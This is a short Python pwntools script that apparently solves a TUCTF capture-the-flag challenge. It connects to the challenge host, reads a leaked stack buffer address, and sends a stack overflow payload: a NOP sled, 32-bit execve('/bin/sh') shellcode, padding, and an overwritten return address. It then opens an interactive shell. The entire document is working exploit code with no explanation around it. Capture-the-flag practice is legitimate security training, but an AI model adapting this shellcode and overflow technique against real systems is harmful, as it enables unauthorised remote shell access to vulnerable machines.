from pwn import *
import struct

HOST = "chal.tuctf.com"
#HOST = "127.0.0.1"
PORT = 30506
#PORT = 4444

conn = remote(HOST, PORT)

def recvall(conn):
	msg = b''
	while True:
		try:
			new_block = conn.recv(timeout=1)
			if new_block == b'':
				break
			msg += new_block	
		except EOFError as e:
			break
	return msg

conn.recvline()

buff_address = int(conn.recvline()[0:10],16)
jump_to = buff_address + 0x4

log.info("Buffer Addres : {}".format(hex(buff_address)))

msg = recvall(conn)
#print(msg)

shellcode = b"\x90"*0x8 + b"\x31\xC0\x50\x50\x59\x5A\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x54\x5B\xB0\x0B\xCD\x80"

payload = shellcode+b"A"*(0x28-len(shellcode))+struct.pack("<I",jump_to)



log.info("Payload length : {}".format(hex(len(payload))))
log.info("Payload : {}".format(payload))
conn.send(payload)

conn.interactive()
conn.close()






